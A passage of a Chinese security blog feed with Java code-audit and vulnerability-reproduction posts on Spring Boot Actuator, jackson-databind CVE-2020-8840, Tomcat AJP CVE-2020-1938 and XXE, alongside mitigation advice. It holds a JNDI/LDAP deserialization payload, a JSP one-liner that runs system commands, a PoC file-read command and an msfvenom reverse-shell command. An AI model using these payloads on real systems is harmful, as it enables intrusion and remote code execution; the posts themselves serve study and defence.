class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadByURL</span><span class="params">(URL url)</span> <span class="keyword">throws</span> JoranException </span>&#123;</span><br><span class="line">       StatusListenerAsList statusListenerAsList = <span class="keyword">new</span> StatusListenerAsList();</span><br><span class="line"></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line">       addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">       loggerContext.reset();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// after a reset the statusListenerAsList gets removed as a listener</span></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (url != <span class="keyword">null</span>) &#123;</span><br><span class="line">               JoranConfigurator configurator = <span class="keyword">new</span> JoranConfigurator();</span><br><span class="line">               configurator.setContext(loggerContext);</span><br><span class="line">               configurator.doConfigure(url);</span><br><span class="line">               addInfo(<span class="string">"Context: "</span> + loggerContext.getName() + <span class="string">" reloaded."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           removeStatusListener(statusListenerAsList);</span><br><span class="line">           <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">               StatusPrinter.print(statusListenerAsList.getStatusList());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>不难发现下面三行代码是关键，重置日志配置。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addStatusListener(statusListenerAsList);</span><br><span class="line">      addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">      loggerContext.reset();</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐文章</strong></p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a><br><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 2</a><a href="https://xz.aliyun.com/t/4259" target="_blank" rel="noopener">关于此漏洞更多的骚操作参考</a></p><hr><p><strong>代码审计关键词</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">trace</span><br><span class="line">health</span><br><span class="line">loggers</span><br><span class="line">metrics</span><br><span class="line">autoconfig</span><br><span class="line">heapdump</span><br><span class="line">threaddump</span><br><span class="line">env</span><br><span class="line">info</span><br><span class="line">dump</span><br><span class="line">configprops</span><br><span class="line">mappings</span><br><span class="line">auditevents</span><br><span class="line">beans</span><br><span class="line">jolokia</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">hystrix.stream</span><br><span class="line">actuator</span><br><span class="line">actuator&#x2F;auditevents</span><br><span class="line">actuator&#x2F;beans</span><br><span class="line">actuator&#x2F;health</span><br><span class="line">actuator&#x2F;conditions</span><br><span class="line">actuator&#x2F;configprops</span><br><span class="line">actuator&#x2F;env</span><br><span class="line">actuator&#x2F;info</span><br><span class="line">actuator&#x2F;loggers</span><br><span class="line">actuator&#x2F;heapdump</span><br><span class="line">actuator&#x2F;threaddump</span><br><span class="line">actuator&#x2F;metrics</span><br><span class="line">actuator&#x2F;scheduledtasks</span><br><span class="line">actuator&#x2F;httptrace</span><br><span class="line">actuator&#x2F;mappings</span><br><span class="line">actuator&#x2F;jolokia</span><br><span class="line">actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure><hr><p><strong>防护措施</strong><br>&emsp;&emsp; 在使用Actuator时，不正确的使用或者一些不经意的疏忽，就会造成严重的信息泄露等安全隐患。在代码审计时如果是springboot项目并且遇到actuator依赖，则有必要对安全依赖及配置进行复查。也可作为一条规则添加到黑盒扫描器中进一步把控。<br>&emsp;&emsp; 安全的做法是一定要引入security依赖，打开安全限制并进行身份验证。同时设置单独的Actuator管理端口并配置不对外网开放。<br>更多防护措施参考<a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p><hr><h2 id="CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞"><a href="#CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞" class="headerlink" title="CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞"></a>CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞</h2><p><strong>&emsp;&emsp; FasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227143135510.gif" alt="在这里插入图片描述"></p><hr><p>我们查看官方的漏洞源码提交修复记录<a href="https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497" target="_blank" rel="noopener">GitHub地址</a>分析。<br><img src="https://img-blog.csdnimg.cn/20200302161840124.png" alt="在这里插入图片描述"></p><ul><li>查看POC ，找到JndiConverter类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\",&#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190911380.png" alt="在这里插入图片描述"></li><li>查看类的继承关系，找到AbstractConverter类</li></ul><p><img src="https://img-blog.csdnimg.cn/20200302191128920.png#pic_center" alt="在这里插入图片描述"></p><ul><li>找到toObject方法，证据不足，继续溯源。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">toObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.toObjectImpl(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>证据充分，此是内奸。重置text内容导致RCE。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.toObject(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">        <span class="keyword">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302192146603.png" alt="在这里插入图片描述"></li></ul><hr><p><strong>思路整理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始</span><br><span class="line">e1&#x3D;&gt;end: 结束</span><br><span class="line">e2&#x3D;&gt;end: RCE</span><br><span class="line">op1&#x3D;&gt;operation: POC字符串</span><br><span class="line">op2&#x3D;&gt;operation: JndiConverter-&gt;toObjectImpl方法</span><br><span class="line">op3&#x3D;&gt;operation: AbstractConverter-&gt;setAsText方法</span><br><span class="line">op4&#x3D;&gt;operation: 请求ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit</span><br><span class="line">op5&#x3D;&gt;operation: Send LDAP reference result for Exploit redirecting to http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">op6&#x3D;&gt;operation: http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">cond&#x3D;&gt;condition: RCE？</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;cond-&gt;op4-&gt;op5-&gt;op6-&gt;e2</span><br><span class="line">cond(yes)-&gt;op4</span><br><span class="line">cond(no)-&gt;e1</span><br></pre></td></tr></table></figure><hr><p><strong>修复方式</strong><br>4. 升级 jackson-databind 至2.9.10.3、2.8.11.5、2.10.x<br>5. 排查项目中是否使用 xbean-reflect。该次漏洞的核心原因是xbean-reflect 中存在特殊的利用链允许用户触发 JNDI 远程类加载操作。将xbean-reflect移除可以缓解漏洞所带来的影响。</p><hr><h1 id="推荐几个历史版本RCE"><a href="#推荐几个历史版本RCE" class="headerlink" title="推荐几个历史版本RCE"></a>推荐几个历史版本RCE</h1><ol><li>com.threedr3am.bug.fastjson.FastjsonSerialize(TemplatesImpl) 利用条件：fastjson &lt;= 1.2.24 + Feature.SupportNonPublicField</li><li>com.threedr3am.bug.fastjson.NoNeedAutoTypePoc 利用条件：fastjson &lt; 1.2.48 不需要任何配置，默认配置通杀RCE</li><li>com.threedr3am.bug.fastjson.HikariConfigPoc(HikariConfig) 利用条件：fastjson &lt;= 1.2.59 RCE，需要开启AutoType</li><li>com.threedr3am.bug.fastjson.CommonsProxyPoc(SessionBeanProvider) 利用条件：fastjson &lt;= 1.2.61 RCE，需要开启AutoType</li><li>cas-4.1.x~4.1.6 反序列化漏洞（利用默认密钥）</li><li>cas-4.1.7~4.2.x 反序列化漏洞（需要知道加密key和签名key）</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/JoyChou93/java-sec-code/wiki" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki</a><br><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a><br><a href="https://www.cnblogs.com/tr1ple/p/12348886.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12348886.html</a><br>[^2]: <a href="https://www.cnblogs.com/isme-zjh/p/11506495.html" target="_blank" rel="noopener">https://www.cnblogs.com/isme-zjh/p/11506495.html</a><br><a href="https://github.com/jas502n/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-8840</a><br><a href="https://github.com/fairyming/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/fairyming/CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;读者受众：所有人&lt;/li&gt;
&lt;li&gt;阅读要求：30mins&lt;/li&gt;
&lt;li&gt;文章中2620还没写完，清水川崎大佬就爆2634了
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="JavaRCE" scheme="https://summersec.github.io/tags/JavaRCE/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</title>
    <link href="https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:12:11.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p><hr><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ul><li>Apache Tomcat 6 </li><li>Apache Tomcat 7 &lt; 7.0.100 </li><li>Apache Tomcat 8 &lt; 8.5.51 </li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 之前代码审计的时候安装了apache tomcat/9.0.29还存在这个漏洞，所以索性复现一下漏洞。这里环境搭建很简单，去官方网站下载tomcat下载安装就好了，不会随便百度一篇文章看看，笔者这里就不多说什么了。</p><p><img src="https://img-blog.csdnimg.cn/20200221193023649.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><code>python poc.py -p 8009 -f &quot;/WEB-INF/web.xml&quot; 127.0.0.1</code><img src="https://img-blog.csdnimg.cn/20200221193441663.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221193330182.jpg" alt="在这里插入图片描述"></p><hr><h1 id="骚操作-RCE"><a href="#骚操作-RCE" class="headerlink" title="骚操作 RCE"></a>骚操作 RCE</h1><p>&emsp;&emsp; 利用大佬hero0修改poc脚本，修改成了python3版本。<br>增加了 –rce选项，会使用jsp渲染执行文本中包含的命令，默认读取文件模式。<br>可以配合上传漏洞进行漏洞利用。<br>命令执行一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200221200551291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195146769.png" alt="在这里插入图片描述"><br><strong>利用msf反弹shell</strong>（也是需要配合上传漏洞）<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</code><br><img src="https://img-blog.csdnimg.cn/20200221202102945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195022259.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h1><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p>一、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <CATALINA_BASE>/conf/server.xml，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：</CATALINA_BASE></CATALINA_BASE></p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code><br>（2）将此行注释掉（也可删掉该行）：</p><p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p><p>（3）保存后需重新启动Tomcat，规则方可生效。</p><p>二、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</code></p><hr><h1 id="文件资料下载"><a href="#文件资料下载" class="headerlink" title="文件资料下载"></a>文件资料下载</h1><p>文中所以资料都在这里。<br>链接: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA" target="_blank" rel="noopener">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> 提取码: xg4s</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.t00ls.net/thread-55061-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55061-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1</a><br><a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a>**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统
      
    
    </summary>
    
    
      <category term="总结" scheme="https://summersec.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="https://summersec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章读懂Java代码审计之XXE</title>
    <link href="https://summersec.github.io/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/"/>
    <id>https://summersec.github.io/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:16:58.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>学习总结Java审计过程中笔记，审计方法</li><li>阅读要求：有简单Java代码基础，了解漏洞原理</li><li>阅读时长：30min 篇幅比较长</li></ul><hr><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; 简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><hr><h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><p>&emsp;&emsp; 不说废话，先看效果，成功读取文本内容。tip: 本次测试中需要将<code>Content-Type: application/x-www-form-urlencoded</code>修改成<code>Content-Type: application/xml</code>不然就无法成功。<br><img src="https://img-blog.csdnimg.cn/20200221154143875.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221153921615.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <strong>代码分析漏洞成因：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxeDocumentBuilderReturn</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(node.getNodeName() + <span class="string">": "</span> + node.getTextContent() + <span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(buf.toString());</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>不难发现我们只要清楚这四行代码功能，就能很好清楚Java解析XML机制。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance方法 ，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。<br><img src="https://img-blog.csdnimg.cn/20200222151828506.png#pic_center" alt="在这里插入图片描述"></p><hr><h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p><img src="https://img-blog.csdnimg.cn/20200221160018601.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(node.getNodeName() + <span class="string">": "</span> + node.getFirstChild().getNodeValue() + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(result.toString());</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 我们使用burp比较器分析两部分代码，不能发现左边就是多了一个判断语句。（左:无回显代码 右:有回显代码）<br><img 